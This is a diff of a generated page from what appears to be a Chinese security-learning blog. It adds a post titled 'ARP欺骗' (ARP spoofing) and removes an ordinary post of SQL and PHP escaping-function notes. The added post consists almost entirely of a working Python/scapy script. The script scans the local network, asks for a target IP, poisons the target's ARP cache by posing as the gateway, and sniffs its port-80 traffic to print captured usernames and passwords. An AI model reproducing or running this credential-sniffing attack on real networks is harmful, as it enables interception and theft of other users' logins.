@@ -169,6 +169,65 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-Arp" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/07/17/Arp/" class="article-date">
+  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/07/17/Arp/">
+        ARP欺骗
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h1><p>代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line">import re </span><br><span class="line">import os</span><br><span class="line">from scapy.all import *</span><br><span class="line">from threading import Thread</span><br><span class="line"></span><br><span class="line">#定义变量函数</span><br><span class="line">wifi = &#x27;Intel(R) Dual Band Wireless-AC 7265&#x27;</span><br><span class="line">rtable = os.popen(&#x27;route print&#x27;).read()</span><br><span class="line">#print(rtable)</span><br><span class="line">#注意将列表转为字符串</span><br><span class="line">getway = re.findall(r&#x27;0\.0\.0\.0\s+0\.0\.0\.0\s+(\S+)\s&#x27;,rtable)[0]</span><br><span class="line">#print(getway)</span><br><span class="line"></span><br><span class="line">#局域网扫描</span><br><span class="line">def scan():</span><br><span class="line"></span><br><span class="line">#SR()函数用来来发送数据包和接收响应，他会返回两个列表数据，一个是answer list 另一个是unanswered list</span><br><span class="line">#公式：pack=Ether(src=攻击者MAC地址,dst=目标MAC地址)/ARP(hwsrc=攻击者MAC地址,psrc=要假装谁就是谁的IP地址,hwdst=目标MAC地址,pdst=目标IP地址,op=2)</span><br><span class="line">    ans,unans = srp(Ether(dst=&#x27;ff:ff:ff:ff:ff:ff&#x27;)/ARP(pdst=getway+&#x27;/24&#x27;),timeout=1)</span><br><span class="line">    print(&#x27;一共扫描到%d个主机：&#x27;%len(ans))</span><br><span class="line">    for i in ans:</span><br><span class="line">        print(i)</span><br><span class="line"> </span><br><span class="line">#找用户名和密码</span><br><span class="line">def paw(p):</span><br><span class="line">    try:</span><br><span class="line">        if p.haslayer(Raw):</span><br><span class="line">            ss=p.load.decode()</span><br><span class="line">            result=re.findall(r&#x27;userName=(.+)&amp;passWord=(.+)&#x27;,ss)</span><br><span class="line">            if result:</span><br><span class="line">                print(&#x27;user:&#x27;,result[0][0])</span><br><span class="line">                print(&#x27;pass:&#x27;,result[0][1])</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">      </span><br><span class="line">#抓包</span><br><span class="line">def capture(tip,tcap):</span><br><span class="line">    #冒充自己为网关</span><br><span class="line">    pkts=sniff(iface=wifi,timeout=tcap,filter=&#x27;tcp port 80 and src host %s&#x27;%tip,prn=paw)</span><br><span class="line">        </span><br><span class="line">#arp欺骗攻击</span><br><span class="line">def arpspoof(tip,tcap):</span><br><span class="line">    t = Thread(target=capture,args=(tip,tcap))</span><br><span class="line">    t.start()</span><br><span class="line">    for i in range(tcap*5):</span><br><span class="line">        sendp(Ether(dst=&#x27;ff:ff:ff:ff:ff:ff&#x27;)/ARP(pdst=target,psrc=getway))</span><br><span class="line">        time.sleep(0.2)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    scan()</span><br><span class="line">    target = input(&#x27;输入要攻击的ip地址：&#x27;).strip()</span><br><span class="line">    tl = int(input(&#x27;输入要准备攻击的时间：&#x27;).strip())</span><br><span class="line">    arpspoof(target,tl)</span><br><span class="line">    print(&#x27;攻击结束！&#x27;)</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" rel="tag">脚本编写</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-SYNgj" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -907,129 +966,6 @@ echo strcmp($_GET['ret'],'wer');
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php%E7%89%B9%E6%80%A7/" rel="tag">php特性</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-sql增删改函数" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/07/17/sql%E5%A2%9E%E5%88%A0%E6%94%B9%E5%87%BD%E6%95%B0/" class="article-date">
-  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/17/sql%E5%A2%9E%E5%88%A0%E6%94%B9%E5%87%BD%E6%95%B0/">
-        sql增删改函数
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="在数据库中增加一段数据"><a href="#在数据库中增加一段数据" class="headerlink" title="在数据库中增加一段数据"></a>在数据库中增加一段数据</h1><h2 id="insert语句"><a href="#insert语句" class="headerlink" title="insert语句"></a>insert语句</h2><ol>
-<li>在标准的sql语句中，一次插入一条记录的insert语句的一种形式<br> insert into tablename(列名…) values(列值…）;<br> 这种方法将列表和列值分开了，使用时列表和列值的数必须一致，如下面向user表中插入一段数据<br> insert into user(id,name,age) value(123,’绕’,19);</li>
-<li>在mysql中还有另一种形式<br> insert into user set column_name1=value1,column_name2=value2,….;<br> 这种方法允许将列表和列值成对的出现和使用，如：<br> insert into user set id=123,name=’绕’,age=18;</li>
-<li>前面两种方法的不同点:<br>(1)第一种方法如果value中什么都不写，则表示mysql将使用表中的每一列的默认值插入新纪录，如：<pre><code>                                               insert into user() value()
-如果表名后面什么都不写，即表示向表中所有字段赋值，此时不仅在values中的值与列数一
-致，且顺序不能颠倒。如：
-                                                 列数为3列
-                                                  insert into user value(123,&#39;绕&#39;);错
-                                                  insert into user value(123,&#39;绕&#39;,19);对
-</code></pre>
-(2)第二种方法使用了set方式，必须至少为一列赋值。如果一个字段使用了省缺值（如默认或自增值）<pre><code>，这两种方法都可以省略这些字段。如：
-                                                   id字段使用了自增值
-                                                   insert into user(name,age) value(ni,19);
-                                                   insert into user set name=ni,age=19;
-</code></pre>
-</li>
-</ol>
-<h1 id="删除函数"><a href="#删除函数" class="headerlink" title="删除函数"></a>删除函数</h1><h2 id="删数据"><a href="#删数据" class="headerlink" title="删数据"></a>删数据</h2><ol>
-<li>delete from 表名；</li>
-<li>有条件的删除数据：delete from 表名 where id=1;</li>
-</ol>
-<h2 id="删除结构"><a href="#删除结构" class="headerlink" title="删除结构"></a>删除结构</h2><ol>
-<li>删数据库：drop database 数据库名</li>
-<li>删除表：drop table 表名</li>
-<li>删除表中的列：alter table 表名 drop column 列名<br>如：delete from user where id=16</li>
-</ol>
-<h1 id="修改函数"><a href="#修改函数" class="headerlink" title="修改函数"></a>修改函数</h1><ol>
-<li>修改所有：updata 表名 set 列名=’新的值，非数字加单引号’</li>
-<li>带条件的修改：updata 表名 set 列名=’新的值，非数字加单引号’<br> 如：updata user set username=’tt’ where id=15</li>
-</ol>
-<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes()"></a>addslashes()</h2><ol>
-<li>addslashes()函数返回在预定义字符之前添加反斜杠的字符串<br> 预定字符:<pre><code>           单引号(&#39;)
-           双引号(&quot;)
-           反斜杠(\)
-           NULL
-</code></pre>
-</li>
-<li>该函数用于为存储在数据中的字符串以及数据库查询语句准备字符串</li>
-<li>默认地，php对所有get和post和cookie数据进行自动查询addslashes()。所以你不要对已转义的字符串再用addslashes()，这会造成双层转义。可以用get_magic_quotes_gpc()来检测</li>
-<li>语法：addslashes(string)  string为要转义的字符串</li>
-</ol>
-<h2 id="stripslashes"><a href="#stripslashes" class="headerlink" title="stripslashes()"></a>stripslashes()</h2><p>函数删除由addslashes()函数添加的反斜杠</p>
-<h2 id="mysql-real-escape-string"><a href="#mysql-real-escape-string" class="headerlink" title="mysql_real_escape_string()"></a>mysql_real_escape_string()</h2><ol>
-<li>函数转义sql语句中使用字符串中的特殊字符<pre><code>     特殊字符：
-                   \x00
-                   \n
-                   \r
-                   \
-                   &#39;
-                   &quot;
-                   \x1a
-</code></pre>
-</li>
-<li>语法：mysql_real_escape_string(string,connection)<pre><code>      string为转义字符串
-      connection 可选。规定mysql连接，未规定，则用上一个连接
-</code></pre>
-</li>
-</ol>
-<h2 id="ctype-digit"><a href="#ctype-digit" class="headerlink" title="ctype_digit()"></a>ctype_digit()</h2><p>检查字符串里的字符是不是数字，是返回ture，不是返回false</p>
-<h2 id="get-magic-quotes-gpc"><a href="#get-magic-quotes-gpc" class="headerlink" title="get_magic_quotes_gpc()"></a>get_magic_quotes_gpc()</h2><ol>
-<li>magic_quotes_gpc=on时，函数magic_quotes_gpc()返回1<br>magic-quotes_gpc=off时，函数magic_quotes_gpc()返回0</li>
-<li>get_magic-quotes-gpc就是得到环境变量magic_quotes_gpc的值</li>
-</ol>
-<h2 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h2><p>用于获取变量的整数值</p>
-<h2 id="mysql-fetch-array"><a href="#mysql-fetch-array" class="headerlink" title="mysql_fetch_array"></a>mysql_fetch_array</h2><p>从结果中取出一行作为关联数组</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" rel="tag">脚本编写</a></li></ul>
 	</div>
 
       
